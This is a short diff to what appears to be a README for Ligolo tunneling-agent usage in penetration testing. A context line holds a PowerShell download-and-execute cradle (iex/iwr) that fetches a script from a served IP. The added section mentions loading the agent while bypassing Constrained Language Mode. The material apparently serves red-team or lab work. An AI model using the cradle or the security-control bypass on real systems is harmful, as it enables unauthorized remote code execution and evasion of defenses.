@@ -12,3 +12,7 @@ Invoke it:
 - `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
 
 *NOTE: make sure both ligolo.ps1 and agent.bin in the same directory, then serve them by simply using python server*.
+
+## CLM Bypass
+
+`ligolo-clmbypass.xml` can be used to load Ligolo agent with bypassing Constrained Language Mode.
